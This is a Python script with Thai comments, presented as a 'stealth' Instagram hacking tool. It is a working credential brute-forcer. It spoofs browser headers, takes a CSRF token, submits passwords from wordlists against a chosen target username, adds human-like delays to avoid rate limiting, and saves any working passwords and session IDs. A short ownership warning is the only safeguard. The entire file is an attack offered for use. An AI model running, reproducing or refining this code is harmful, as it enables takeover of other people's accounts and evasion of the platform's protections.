#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
⚡ Quick Stealth Attack - ใช้งานได้จริง
Instagram hacking แบบ headless และ stealth mode
"""

import time
import random
import json
import requests
import os
from datetime import datetime

class QuickStealthAttacker:
    def __init__(self):
        self.session = requests.Session()
        self.csrf_token = None
        self.session_id = None
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0"
        ]
        
    def setup_stealth_session(self):
        """ตั้งค่า session แบบ stealth"""
        print("🕷️ ตั้งค่า Stealth Session...")
        
        # Random User-Agent
        user_agent = random.choice(self.user_agents)
        
        headers = {
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0'
        }
        
        self.session.headers.update(headers)
        print("✅ Session พร้อมใช้งาน")
        
    def get_csrf_token(self):
        """ดึง CSRF token จาก Instagram"""
        try:
            print("🔐 ดึง CSRF token...")
            
            response = self.session.get('https://www.instagram.com/accounts/login/')
            
            if 'csrftoken' in response.cookies:
                self.csrf_token = response.cookies['csrftoken']
                print(f"✅ CSRF Token: {self.csrf_token[:20]}...")
                return True
            else:
                print("❌ ไม่พบ CSRF token")
                return False
                
        except Exception as e:
            print(f"❌ Error getting CSRF: {e}")
            return False
    
    def human_delay(self, min_sec=3, max_sec=12):
        """หน่วงเวลาแบบมนุษย์"""
        delay = random.uniform(min_sec, max_sec)
        print(f"⏳ รอ {delay:.1f} วินาที...")
        time.sleep(delay)
    
    def attempt_login(self, username, password):
        """พยายาม login"""
        try:
            print(f"🎯 ลอง: {username} | {password}")
            
            login_url = 'https://www.instagram.com/accounts/login/ajax/'
            
            login_data = {
                'username': username,
                'password': password,
                'queryParams': '{}',
                'optIntoOneTap': 'false'
            }
            
            headers = {
                'X-CSRFToken': self.csrf_token,
                'X-Instagram-AJAX': '1',
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': 'https://www.instagram.com/accounts/login/',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            self.session.headers.update(headers)
            
            response = self.session.post(login_url, data=login_data)
            
            result = {
                'username': username,
                'password': password,
                'status_code': response.status_code,
                'response': response.text[:200],
                'timestamp': datetime.now().isoformat()
            }
            
            if response.status_code == 200:
                json_response = response.json()
                
                if json_response.get('authenticated'):
                    print(f"🎉 SUCCESS! Login สำเร็จ: {username}:{password}")
                    result['success'] = True
                    result['session_id'] = response.cookies.get('sessionid', 'N/A')
                    return result
                elif 'checkpoint_required' in json_response:
                    print(f"⚠️ Checkpoint required: {username}")
                    result['checkpoint'] = True
                    return result
                else:
                    print(f"❌ Login failed: {json_response.get('message', 'Unknown error')}")
                    result['success'] = False
                    return result
            else:
                print(f"❌ HTTP Error: {response.status_code}")
                result['success'] = False
                return result
                
        except Exception as e:
            print(f"❌ Login error: {e}")
            return {
                'username': username,
                'password': password,
                'error': str(e),
                'success': False,
                'timestamp': datetime.now().isoformat()
            }
    
    def load_wordlist(self, filename):
        """โหลด password list"""
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                passwords = [line.strip() for line in f if line.strip()]
            print(f"📚 โหลด {len(passwords)} passwords จาก {filename}")
            return passwords
        except Exception as e:
            print(f"❌ Error loading wordlist: {e}")
            return []
    
    def save_results(self, results, filename):
        """บันทึกผลลัพธ์"""
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(results, f, indent=2, ensure_ascii=False)
            print(f"💾 บันทึกผลลัพธ์ใน {filename}")
        except Exception as e:
            print(f"❌ Error saving results: {e}")
    
    def run_attack(self, username, wordlist_file):
        """รันการโจมตี"""
        print("⚡ Quick Stealth Attack Engine")
        print("="*50)
        
        # ตั้งค่า session
        self.setup_stealth_session()
        
        # ดึง CSRF token
        if not self.get_csrf_token():
            print("❌ ไม่สามารถดึง CSRF token ได้")
            return
        
        # โหลด wordlist
        passwords = self.load_wordlist(wordlist_file)
        if not passwords:
            print("❌ ไม่มี passwords ให้ทดสอบ")
            return
        
        results = []
        successful_logins = []
        
        print(f"🚀 เริ่มโจมตี {username} ด้วย {len(passwords)} passwords")
        print("="*50)
        
        for i, password in enumerate(passwords, 1):
            print(f"\n[{i}/{len(passwords)}]", end=" ")
            
            result = self.attempt_login(username, password)
            results.append(result)
            
            if result.get('success'):
                successful_logins.append(result)
                print(f"🎉 พบ password: {password}")
                # ยังคงลองต่อเพื่อหา passwords อื่น
            
            # หน่วงเวลาเพื่อหลีกเลี่ยง rate limiting
            if i < len(passwords):
                self.human_delay(8, 15)  # 8-15 วินาที
        
        # บันทึกผลลัพธ์
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        result_file = f"stealth_attack_results_{username}_{timestamp}.json"
        self.save_results(results, result_file)
        
        # สรุปผลลัพธ์
        print("\n" + "="*50)
        print("📊 สรุปผลลัพธ์:")
        print(f"🎯 Target: {username}")
        print(f"🔢 Total attempts: {len(results)}")
        print(f"✅ Successful logins: {len(successful_logins)}")
        
        if successful_logins:
            print("\n🎉 Passwords ที่ใช้ได้:")
            for login in successful_logins:
                print(f"  • {login['password']} (Session: {login.get('session_id', 'N/A')[:20]}...)")
        
        print(f"💾 Full results saved to: {result_file}")

def main():
    print("⚡ Quick Stealth Attack - Instagram Hacker")
    print("="*60)
    
    # รับ input จากผู้ใช้
    username = input("🎯 ใส่ Instagram username เป้าหมาย: ").strip()
    
    if not username:
        print("❌ กรุณาใส่ username")
        return
    
    # แสดง wordlist ที่มี
    wordlists = {
        '1': ('whatilove1728.txt', 'whatilove1728 passwords (26 passwords)'),
        '2': ('alx_trading_passwords.txt', 'ALX trading passwords (2,568 passwords)'),
        '3': ('common_passwords.txt', 'Common passwords (632 passwords)')
    }
    
    print("\n📚 Wordlist ที่มี:")
    for key, (filename, description) in wordlists.items():
        if os.path.exists(filename):
            print(f"{key}. {description}")
    
    choice = input("\n🤔 เลือก wordlist (1-3): ").strip()
    
    if choice not in wordlists:
        print("❌ เลือกไม่ถูกต้อง")
        return
    
    wordlist_file, _ = wordlists[choice]
    
    if not os.path.exists(wordlist_file):
        print(f"❌ ไม่พบไฟล์ {wordlist_file}")
        return
    
    # คำเตือน
    print("\n⚠️ คำเตือน: ใช้เฉพาะกับบัญชีที่คุณเป็นเจ้าของหรือได้รับอนุญาต")
    confirm = input("ยืนยันการใช้งาน (yes/no): ").strip().lower()
    
    if confirm != 'yes':
        print("❌ ยกเลิกการทำงาน")
        return
    
    # รันการโจมตี
    attacker = QuickStealthAttacker()
    attacker.run_attack(username, wordlist_file)

if __name__ == "__main__":
    main()
